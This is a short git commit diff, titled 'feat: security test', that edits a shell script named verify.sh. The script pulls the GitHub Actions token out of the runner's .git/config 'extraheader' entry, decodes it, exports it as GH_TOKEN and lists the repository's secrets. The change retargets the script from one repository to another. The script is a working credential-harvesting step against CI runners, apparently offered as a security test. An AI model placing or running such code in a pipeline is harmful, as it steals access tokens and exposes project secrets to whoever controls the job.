2fa88f592af5b715f55dd8861a9a3c77c7fce5d7
your_user_name <your_email_address>
2025-01-16 11:17:46 +0100

    feat: security test

--- verify.sh
+++ verify.sh
@@ -1,3 +1,3 @@
-export GH_TOKEN=$(grep "extraheader" /home/runner/work/gatsby-example/gatsby-example/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2)
+export GH_TOKEN=$(grep "extraheader" /home/runner/work/gh-sherpa/gh-sherpa/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2)
 
 gh secret list
